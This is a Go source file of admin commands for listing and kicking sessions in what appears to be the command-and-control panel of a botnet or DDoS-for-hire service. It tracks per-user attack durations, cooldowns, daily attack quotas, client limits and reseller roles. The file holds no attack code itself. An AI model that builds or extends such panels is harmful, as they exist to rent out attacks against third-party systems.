package commands

import (
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"cnc/pkg/pattern"
	"fmt"
	"github.com/alexeyco/simpletable"
	"github.com/dustin/go-humanize"
	"strconv"
)

func init() {
	var sessionsKick = &command.Command{
		Aliases:     []string{"kick"},
		Roles:       []string{"admin"},
		Description: "Kicks a user.",
		Arguments: []*command.Argument{
			command.NewArgument("user", nil, command.ArgumentUser, true),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			user, err := ctx.User("user")
			if err != nil {
				return err
			}

			// get session by name
			userSession := sessions.SessionByName(user.Name)
			if userSession == nil || userSession.ID == session.ID {
				return session.Notification("There is no session with that name.")
			}

			// close session and notify
			userSession.Close()
			return session.Notification("Kicked %s.", strconv.Quote(userSession.Name))
		},
	}

	var sessionsKickAll = &command.Command{
		Aliases:     []string{"kickall"},
		Roles:       []string{"admin"},
		Description: "Kicks all users.",
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			var closed = 0

			// iterate through all sessions and close them
			for _, s := range sessions.Clone() {
				if s.ID == session.ID {
					continue
				}

				s.Close()
				closed++
			}

			return session.Notification("Kicked %d users.", closed)
		},
	}

	command.Create(&command.Command{
		Aliases:     []string{"sessions"},
		Roles:       []string{"admin", "reseller"},
		Description: "View all current connected users.",
		SubCommands: []*command.Command{
			sessionsKick,
			sessionsKickAll,
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			// retrieve all users from the database
			users := sessions.Clone()

			// create table & set headers
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "id"},
					{Align: simpletable.AlignCenter, Text: "username"},
					{Align: simpletable.AlignCenter, Text: "duration"},
					{Align: simpletable.AlignCenter, Text: "cooldown"},
					{Align: simpletable.AlignCenter, Text: "daily attacks"},
					{Align: simpletable.AlignCenter, Text: "max. clients"},
					{Align: simpletable.AlignCenter, Text: "expiry"},
					{Align: simpletable.AlignCenter, Text: "roles"},
					{Align: simpletable.AlignCenter, Text: "created"},
				},
			}

			// go through all users and add it to the cell
			for _, user := range users {
				cell := []*simpletable.Cell{
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", user.UserProfile.ID)},
					{Align: simpletable.AlignLeft, Text: user.Name},
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.Duration)},
					{Align: simpletable.AlignRight, Text: fmt.Sprint(user.Cooldown)},
					{Align: simpletable.AlignRight, Text: fmt.Sprintf("%d/%d", user.LeftAttacks(), user.DailyAttacks)},
					{Align: simpletable.AlignRight, Text: pattern.FormatCount(user.Clients, "infinite")},
					{Align: simpletable.AlignLeft, Text: humanize.Time(user.Expiry)},
					{Align: simpletable.AlignLeft, Text: pattern.FormatArray(user.Roles)},
					{Align: simpletable.AlignLeft, Text: humanize.Time(user.Created)},
				}

				table.Body.Cells = append(table.Body.Cells, cell)
			}

			// render table
			table.SetStyle(simpletable.StyleCompact)
			return session.Table(table, 1)
		},
	})
}
